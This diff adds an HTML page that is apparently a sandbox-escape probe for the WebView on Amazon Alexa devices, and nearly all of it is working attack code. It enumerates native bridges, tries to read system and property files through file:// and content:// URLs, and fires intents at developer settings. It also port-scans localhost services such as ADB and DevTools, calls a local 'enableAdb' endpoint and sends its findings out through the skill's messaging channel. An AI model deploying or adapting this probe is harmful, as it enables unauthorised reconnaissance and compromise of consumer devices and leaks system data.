@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Probe</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 8px; font-size: 11px; overflow-y: auto; }
+h2 { color: #0ff; margin: 4px 0 2px; font-size: 13px; }
+.hit { color: #f00; font-weight: bold; }
+.miss { color: #555; }
+.info { color: #ff0; }
+.test { color: #888; }
+#log { white-space: pre-wrap; word-break: break-all; }
+</style>
+</head>
+<body>
+<h2>Alexa WebView Probe</h2>
+<div id="ua" class="info"></div>
+<div id="status" class="test">Probing...</div>
+<div id="log"></div>
+
+<script>
+var L = document.getElementById('log');
+var hitCount = 0;
+var findings = [];
+
+function log(cls, msg) {
+    var d = document.createElement('div');
+    d.className = cls;
+    d.textContent = msg;
+    L.appendChild(d);
+    if (cls === 'hit') {
+        hitCount++;
+        findings.push(msg);
+    }
+    if (cls === 'hit' && window.Alexa) {
+        try { Alexa.create({version: '1.1'}).then(function(a) { a.skill.sendMessage({hit: msg}); }); } catch(e) {}
+    }
+}
+
+document.getElementById('ua').textContent = 'UA: ' + navigator.userAgent;
+log('info', 'URL: ' + window.location.href);
+log('info', 'Protocol: ' + window.location.protocol);
+log('info', 'Origin: ' + window.location.origin);
+
+log('info', '\n=== Alexa API ===');
+if (window.Alexa) {
+    log('hit', '[ALEXA] window.Alexa exists! type=' + typeof Alexa);
+    try {
+        var keys = Object.getOwnPropertyNames(Alexa);
+        log('hit', '  Keys: ' + keys.join(', '));
+    } catch(e) {}
+    try {
+        Alexa.create({version: '1.1'}).then(function(alexa) {
+            log('hit', '[ALEXA] Client created successfully');
+            try {
+                var akeys = Object.getOwnPropertyNames(alexa);
+                log('hit', '  Client keys: ' + akeys.join(', '));
+            } catch(e) {}
+            try {
+                if (alexa.capabilities) log('hit', '  Capabilities: ' + JSON.stringify(alexa.capabilities));
+            } catch(e) {}
+            try {
+                if (alexa.skill) {
+                    log('hit', '  skill object: ' + Object.getOwnPropertyNames(alexa.skill).join(', '));
+                }
+            } catch(e) {}
+            try {
+                if (alexa.voice) {
+                    log('hit', '  voice object: ' + Object.getOwnPropertyNames(alexa.voice).join(', '));
+                }
+            } catch(e) {}
+            try {
+                if (alexa.media) {
+                    log('hit', '  media object: ' + Object.getOwnPropertyNames(alexa.media).join(', '));
+                }
+            } catch(e) {}
+            try {
+                if (alexa.performance) {
+                    log('hit', '  performance: ' + Object.getOwnPropertyNames(alexa.performance).join(', '));
+                }
+            } catch(e) {}
+            try {
+                for (var k in alexa) {
+                    var t = typeof alexa[k];
+                    if (t === 'object' && alexa[k]) {
+                        log('info', '  alexa.' + k + ' = {' + Object.getOwnPropertyNames(alexa[k]).join(', ') + '}');
+                    } else if (t === 'function') {
+                        log('info', '  alexa.' + k + '()');
+                    } else {
+                        log('info', '  alexa.' + k + ' = ' + String(alexa[k]).substring(0, 100));
+                    }
+                }
+            } catch(e) {}
+        }).catch(function(e) {
+            log('info', '[ALEXA] Create failed: ' + e.message);
+        });
+    } catch(e) {
+        log('info', '[ALEXA] Create error: ' + e.message);
+    }
+} else {
+    log('miss', 'No window.Alexa');
+}
+
+log('info', '\n=== JavaScript Bridges ===');
+var bridges = ['Android', 'android', 'app', 'alexa', 'AlexaBridge',
+    'webkit', 'webview', 'native', 'device', 'echo', 'amazon', 'fire',
+    'captivePortal', 'CaptivePortal', 'AmazonWebView', 'system',
+    'AlexaApp', 'alexaApp', 'DeviceControl', 'deviceControl',
+    'AmazonDevice', 'FireOS', 'SystemSettings', 'ADB'];
+
+for (var i = 0; i < bridges.length; i++) {
+    try {
+        var val = window[bridges[i]];
+        if (val !== undefined && val !== null && bridges[i] !== 'Alexa') {
+            log('hit', '[BRIDGE] window.' + bridges[i] + ' = ' + typeof val);
+            try {
+                var keys = Object.getOwnPropertyNames(val);
+                if (keys.length > 0) log('hit', '  Methods: ' + keys.join(', '));
+            } catch(e2) {}
+        }
+    } catch(e) {
+        if (e.message && e.message.indexOf('denied') > -1)
+            log('hit', '[BRIDGE-DENIED] window.' + bridges[i] + ': ' + e.message);
+    }
+}
+
+log('info', '\n=== Non-standard window props ===');
+var standard = new Set(['location','document','navigator','screen','history','localStorage',
+    'sessionStorage','indexedDB','console','performance','crypto','fetch','XMLHttpRequest',
+    'WebSocket','Worker','Notification','alert','confirm','prompt','setTimeout','setInterval',
+    'clearTimeout','clearInterval','requestAnimationFrame','postMessage','close','focus','blur',
+    'open','stop','print','getComputedStyle','matchMedia','getSelection','scrollTo','atob','btoa',
+    'encodeURI','decodeURI','encodeURIComponent','decodeURIComponent','isNaN','isFinite',
+    'parseInt','parseFloat','undefined','NaN','Infinity','eval','self','top','parent','frames',
+    'length','name','status','closed','opener','origin','innerWidth','innerHeight',
+    'outerWidth','outerHeight','devicePixelRatio','Image','Option','Audio','Alexa']);
+try {
+    var props = Object.getOwnPropertyNames(window);
+    var unusual = [];
+    for (var j = 0; j < props.length; j++) {
+        if (!standard.has(props[j]) && !props[j].match(/^(on|webkit|chrome|CSS|DOM|HTML|SVG|URL|Event|Node|Element|Range|Text|Attr|Intl|WeakRef|Finalization|Aggregate|queue|structured|report|navigation)/i)) {
+            var typ = 'unknown';
+            try { typ = typeof window[props[j]]; } catch(e) {}
+            if (typ === 'function' || typ === 'object') unusual.push(props[j] + '(' + typ + ')');
+        }
+    }
+    if (unusual.length > 0) log('hit', 'Non-standard: ' + unusual.join(', '));
+    else log('miss', 'No unusual window properties');
+} catch(e) {}
+
+log('info', '\n=== file:// Access ===');
+var fileUrls = [
+    'file:///system/build.prop',
+    'file:///etc/hosts',
+    'file:///proc/version',
+    'file:///data/property/persistent_properties',
+    'file:///default.prop',
+];
+
+function tryXHR(url) {
+    return new Promise(function(resolve) {
+        try {
+            var xhr = new XMLHttpRequest();
+            xhr.timeout = 2000;
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.responseText) log('hit', '[XHR] ' + url + ': ' + xhr.responseText.substring(0, 200));
+                    else log('miss', '[XHR] ' + url + ': empty');
+                    resolve();
+                }
+            };
+            xhr.onerror = function() { log('miss', '[XHR] ' + url + ': err'); resolve(); };
+            xhr.ontimeout = function() { log('miss', '[XHR] ' + url + ': timeout'); resolve(); };
+            xhr.open('GET', url, true);
+            xhr.send();
+        } catch(e) {
+            log(e.message.indexOf('denied')>-1?'hit':'miss', '[XHR] ' + url + ': ' + e.message);
+            resolve();
+        }
+    });
+}
+
+function tryFetch(url) {
+    return new Promise(function(resolve) {
+        try {
+            fetch(url).then(function(r) {
+                return r.text().then(function(t) {
+                    if (t) log('hit', '[FETCH] ' + url + ': ' + t.substring(0, 200));
+                    else log('miss', '[FETCH] ' + url + ': empty');
+                    resolve();
+                });
+            }).catch(function(e) { log('miss', '[FETCH] ' + url + ': ' + e.message); resolve(); });
+        } catch(e) { log('miss', '[FETCH] ' + url + ': ' + e.message); resolve(); }
+    });
+}
+
+var contentUrls = [
+    'content://settings/system',
+    'content://settings/secure',
+    'content://settings/global',
+    'content://settings/secure/adb_enabled',
+    'content://settings/global/development_settings_enabled',
+];
+
+var intents = [
+    'intent:#Intent;action=android.settings.APPLICATION_DEVELOPMENT_SETTINGS;end',
+    'intent:#Intent;action=android.settings.SETTINGS;end',
+    'intent:#Intent;component=com.android.settings/.DevelopmentSettings;end',
+    'intent:#Intent;action=com.amazon.device.settings.action.DEVELOPER_OPTIONS;end',
+];
+
+var scanPorts = [
+    [5555, 'ADB'], [5037, 'ADB srv'], [8080, 'oobed'],
+    [9222, 'DevTools'], [1080, 'SOCKS'], [4070, 'Spotify'],
+    [55442, 'whad'], [5541, 'unknown'],
+];
+
+function wsProbe(port, label) {
+    return new Promise(function(resolve) {
+        var start = performance.now();
+        var done = false;
+        var tid = setTimeout(function() {
+            if (!done) { done = true; resolve({port:port, label:label, ms:2000, event:'timeout'}); }
+        }, 2000);
+        try {
+            var ws = new WebSocket('ws://127.0.0.1:' + port + '/');
+            ws.onopen = function() { if (!done) { done=true; clearTimeout(tid); ws.close(); resolve({port:port, label:label, ms:Math.round(performance.now()-start), event:'open'}); } };
+            ws.onerror = function() { if (!done) { done=true; clearTimeout(tid); resolve({port:port, label:label, ms:Math.round(performance.now()-start), event:'error'}); } };
+            ws.onclose = function() { if (!done) { done=true; clearTimeout(tid); resolve({port:port, label:label, ms:Math.round(performance.now()-start), event:'close'}); } };
+        } catch(e) { if (!done) { done=true; clearTimeout(tid); resolve({port:port, label:label, ms:0, event:'exception'}); } }
+    });
+}
+
+function tryIframe(url, label) {
+    return new Promise(function(resolve) {
+        try {
+            var f = document.createElement('iframe');
+            f.style.display = 'none';
+            f.src = url;
+            var done = false;
+            f.onload = function() {
+                if (!done) {
+                    done = true;
+                    try {
+                        var c = f.contentDocument ? f.contentDocument.body.innerText : '';
+                        if (c) log('hit', '[IFRAME] ' + label + ': ' + c.substring(0, 200));
+                        else log('test', '[IFRAME] ' + label + ': loaded (cross-origin)');
+                    } catch(e) { log('test', '[IFRAME] ' + label + ': cross-origin blocked'); }
+                    try{document.body.removeChild(f);}catch(e){}
+                    resolve();
+                }
+            };
+            f.onerror = function() { if (!done) { done=true; log('miss', '[IFRAME] ' + label + ': err'); try{document.body.removeChild(f);}catch(e){} resolve(); } };
+            setTimeout(function() { if (!done) { done=true; log('miss', '[IFRAME] ' + label + ': timeout'); try{document.body.removeChild(f);}catch(e){} resolve(); } }, 3000);
+            document.body.appendChild(f);
+        } catch(e) { log('miss', '[IFRAME] ' + label + ': ' + e.message); resolve(); }
+    });
+}
+
+async function runAll() {
+    await new Promise(function(r) { setTimeout(r, 2000); });
+
+    for (var i = 0; i < fileUrls.length; i++) {
+        await tryXHR(fileUrls[i]);
+        await tryFetch(fileUrls[i]);
+    }
+
+    log('info', '\n=== content:// ===');
+    for (var i = 0; i < contentUrls.length; i++) {
+        await tryXHR(contentUrls[i]);
+        await tryFetch(contentUrls[i]);
+        await tryIframe(contentUrls[i], contentUrls[i]);
+    }
+
+    log('info', '\n=== intent:// ===');
+    for (var i = 0; i < intents.length; i++) {
+        await tryIframe(intents[i], intents[i].substring(0, 60));
+    }
+
+    log('info', '\n=== Localhost Ports ===');
+    var baselines = [];
+    for (var b of [2000, 2001, 6666]) {
+        var br = await wsProbe(b, 'baseline');
+        baselines.push(br.ms);
+    }
+    var avgBase = baselines.reduce(function(a,b){return a+b;},0) / baselines.length;
+    log('info', 'Baseline: ' + Math.round(avgBase) + 'ms');
+
+    for (var i = 0; i < scanPorts.length; i++) {
+        var r = await wsProbe(scanPorts[i][0], scanPorts[i][1]);
+        var diff = r.ms - avgBase;
+        var interesting = Math.abs(diff) > 50 || r.event === 'open';
+        log(interesting ? 'hit' : 'miss',
+            (interesting ? '[DIFF] ' : '[same] ') + scanPorts[i][0] + ' (' + scanPorts[i][1] + '): ' +
+            r.ms + 'ms/' + r.event + ' d:' + Math.round(diff));
+    }
+
+    log('info', '\n=== Special URLs ===');
+    for (var s of ['chrome://settings','chrome://inspect','about:config']) await tryIframe(s, s);
+
+    log('info', '\n=== Localhost HTTP ===');
+    for (var ep of ['http://127.0.0.1:5555/','http://127.0.0.1:8080/','http://127.0.0.1:8080/enableAdb','http://127.0.0.1:9222/json/version'])
+        await tryFetch(ep);
+
+    document.getElementById('status').textContent = 'DONE - ' + hitCount + ' hits';
+    document.getElementById('status').className = hitCount > 0 ? 'hit' : 'info';
+    log('info', '\n=== COMPLETE: ' + hitCount + ' findings ===');
+
+    if (window.Alexa) {
+        try {
+            Alexa.create({version: '1.1'}).then(function(a) {
+                a.skill.sendMessage({done: true, hits: hitCount, findings: findings});
+            });
+        } catch(e) {}
+    }
+}
+
+runAll();
+</script>
+</body>
+</html>
